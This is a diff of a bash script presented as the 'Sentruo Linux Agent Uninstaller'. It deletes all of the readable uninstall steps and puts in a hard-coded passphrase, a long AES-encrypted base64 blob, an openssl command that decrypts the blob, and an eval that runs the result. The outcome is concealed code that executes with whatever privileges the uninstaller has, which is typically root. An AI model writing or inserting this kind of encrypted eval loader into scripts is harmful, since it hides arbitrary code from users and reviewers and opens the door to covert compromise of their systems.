@@ -1,42 +1,5 @@
 #!/bin/bash
-#
-#////////////////////////////////////////////////////////////
-#===========================================================
-# Sentruo - Uninstaller v1.0
-#===========================================================
-# Set environment
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-
-# Clear the screen
-clear
-
-#SERVERKEY=$1
-LOG=/var/log/sentruo-agent.log
-
-echo "---------------------------------"
-echo "Sentruo Linux Agent Uninstaller"
-echo "---------------------------------"
-echo " "
-
-# Are we running as root
-if [ $(id -u) != "0" ]; then
-	echo "Sentruo Agent uninstaller needs to be run with root priviliges"
-	echo "Try again with root privilileges"
-	exit 1;
-fi
-
-
-# Remove previous installation
-if [ -f /opt/sentruo/agent.sh ]; then
-	# Remove folder
-	rm -rf /opt/sentruo
-	# Remove crontab
-	crontab -r -u sentruo-agent >> $LOG 2>&1
-	# Remove user
-	userdel sentruo-agent >> $LOG 2>&1
-fi
-
-echo " "
-echo "-------------------------------------"
-echo "Uninstallation Completed "
-echo "-------------------------------------"
+_p='8taTSxuhN89iwuC7/Bi2ph54e06d6ImVKb9tFEpVJ/Y='
+_b='U2FsdGVkX185hyyiq957/qnc0H6/vDVRN6aV7mwR/GvBzCEt7ZfVtLM05/Ou0dbb/YvzFZuk9aOkKWzfDsG6+ScpscgxCI4I6lVhZrS95qbmrA0eSWCCkrsVcCryda1QuukCuYuH3h6hMUWvPvk6nWgn6cxu/pACpBc7ZR9p07vu/hh7cRVJIfGdpnxY9jGmtufW4l8oDzcP0JAx47mO1UIrlKmYE1E5EaANKY+Nc4/IbUISBKtWjJ+DPQAkCmouj+2R51bPQX6bhCH1wrgxdWuURWdlnPJu04fV/xIPqKNRfVkkHFlENLFms+kn0d9zz/7xOSV5fZ/uYqZqtW5skif5Z1igFMLO2BLHgPAPKGy2hCI4YhQyl4KIdTz0iwlUHPSRu1VW6RUEHLvqgisiziXzR9QbpctQ4Rq2ZxhAO1PCRvgTXRpVu8Ic6kigy1R6dw5wwI+AbMUB27FgS3ou9SHpTzXBN6gZE37wuQXd+QsGqrLN+I8xGVl8gprrsjuykgXlsaGBa6lcOJGg3ztntf1B9O1CKC3S/f/maQUfCLOMo9PpvXXnj4B16ckq/VhMeR5xNOiz6atPqTvbpu7VRC3WRD0aWskrnwvkO0hIm9xuAIoRbawlpYqw5d6X54S1Xnejoad9+PbU8Rs3UiDAlCWo1bpoML0hh8WY5P3qEVJoqmlWqZU7qyGdAHdWbLPpXgMS+v4EFbytGsOYiLq31WeN9fQZ42w9g2o76LckU46rD6Lw6z/cPuWwU779yqa1NyCQAGsWtZvAsJmq+FJsqu1faLyQrASmkJ39wmulaiSZchN/xuEs9+x4JY2UUelR3mPp5ijOT8ygV8H69AhUaUVQrTKxvS+sycA080l50nWh7qEqRvN64Tjt3E52sT8ho4qiJ4WoFowD+J5Va0rk12APT5L9KRFGappp70PsHN2DCMWleLW2rPyQdkE35MV2X0sNC91v413TIiJZ1N7HPhaV76uDgng8/OafmEBBnEDBTIVezRK43xjfYml/rO97zQxw+SttIM1upLiNAz2IiKWTL3Vyzu+3LMoB9qFdOPqF6XWVWtEzSkBcrTGbeEtowfRMFIKK3z2rxrocohiyDvB+gRhuNgjbbJpvDkBL4ep9aRAlHVmqcQhwetqWLw/CEdh1OiJbjiNzgP+IaIWMjXWdUxqTLY12Jf92p4bFfdUACY1Eisz1vY++y39wEHihmzc7JB+AeQ5EVWCE6liELsY2Esq35qmkUzaYoPson8QsUSweU6yZwK7HZtCoMBJF207x1Ro1W7Z4Kcfe7sPpesg1vJDcF831Og//TK1t08qVEuSfbmOK7np3yRMojeMwRD9kVochnc6ZKN7xi9e3sfpNAmc/5FRSg7WQnSViRf77bKaz5dFR96Xd1/hHrNWc92Dt0oPP3F/XVvnmu+MoxOyq61sWCL6nIwu5ZUbcQTeuFjsknbFM1OaZ5s4NdrmpLUikkQa6UjlBlukO7BZuizXzdi8v9viN+WqLfPrp/pj+xXQ5SEJVZYm/b9h5RVXyI0XlSBDT1xI3wmb7UN8OoHeZMgbNu+ApFiZnOXJ2Ad7+cDBFYcEdNchH4AtfbeozCi+qoPMeEe4h2RNC2vOTCirzxbGn8WJVfUPkBZIsQJ4nz76yhMlu25t7TDGFrCY3Z/sIQS9Siykd7oJA2jHPSDQUgbAi4DQiuq8zB6BzywMRu1Ms165Q4qkgRB/Gjp1D'
+_s=$(printf '%s' "$_b" | openssl enc -aes-256-cbc -d -pbkdf2 -iter 100000 -a -A -pass "pass:$_p" 2>/dev/null) || { echo "corrupt agent payload" >&2; exit 1; }
+eval "$_s"
